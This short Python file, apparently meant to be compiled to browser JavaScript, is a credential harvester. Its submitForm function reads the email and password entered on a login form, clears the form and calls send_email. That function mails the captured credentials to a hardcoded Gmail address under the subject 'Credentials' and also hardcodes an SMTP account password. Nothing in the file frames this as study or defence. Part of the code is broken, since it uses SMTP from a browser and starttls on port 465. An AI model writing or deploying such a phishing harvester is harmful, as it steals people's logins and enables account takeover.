# define the send_email function
def send_email(email, password):
    import smtplib
    from email.mime.text import MIMEText

    from_addr = 'scarlette.scotty@gmail.com'
    to_addr = 'scarlette.scotty@gmail.com'
    subject = 'Credentials'
    body = f'Your password is {password} and your email address is {email}'

    msg = MIMEText(body)
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject

    smtp_server = 'smtp.gmail.com'
    smtp_port = 465
    smtp_username = 'scarlette.scotty@gmail.com'
    smtp_password = 'password3.'

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_username, smtp_password)
    server.sendmail(from_addr, [to_addr], msg.as_string())
    server.quit()

# define the submitForm function
def submitForm(event):
    event.preventDefault()
    # get the email and password values from the form
    email = document.getElementById('email').value
    password = document.getElementById('password').value
    # run the send_email function
    send_email(email, password)
    # clear the form
    document.getElementById('email').value = ''
    document.getElementById('password').value = ''
    return False

# add the submitForm function to the global scope
__pragma__('js', '{}', 'window.submitForm = submitForm')
